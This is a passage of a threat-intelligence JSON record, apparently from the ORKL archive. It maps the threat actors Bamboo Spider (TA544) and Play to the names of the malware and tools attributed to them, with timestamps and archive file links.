            "reports": null
        },
        {
            "id": "1f679d2e-c5c9-49e9-b854-2eca06a870e4",
            "created_at": "2022-10-25T16:07:24.453427Z",
            "updated_at": "2025-03-27T02:02:10.237233Z",
            "deleted_at": null,
            "main_name": "Bamboo Spider",
            "aliases": [
                "Bamboo Spider",
                "TA544"
            ],
            "source_name": "ETDA:Bamboo Spider",
            "tools": [
                "AndroKINS",
                "Bebloh",
                "Chthonic",
                "DELoader",
                "Dofoil",
                "GozNym",
                "Gozi ISFB",
                "ISFB",
                "Nymaim",
                "PandaBanker",
                "Pandemyia",
                "Sharik",
                "Shiotob",
                "Smoke Loader",
                "SmokeLoader",
                "Terdot",
                "URLZone",
                "XSphinx",
                "ZLoader",
                "Zeus OpenSSL",
                "Zeus Panda",
                "Zeus Sphinx",
                "ZeusPanda",
                "nymain"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535531,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653787366,
    "ts_modification_date": 1653787366,
    "files": {
        "pdf": "https://archive.orkl.eu/fefe5841f45f17a020e9a6626d160edd96f20023.pdf",
        "text": "https://archive.orkl.eu/fefe5841f45f17a020e9a6626d160edd96f20023.txt",
        "img": "https://archive.orkl.eu/fefe5841f45f17a020e9a6626d160edd96f20023.jpg"
    }
}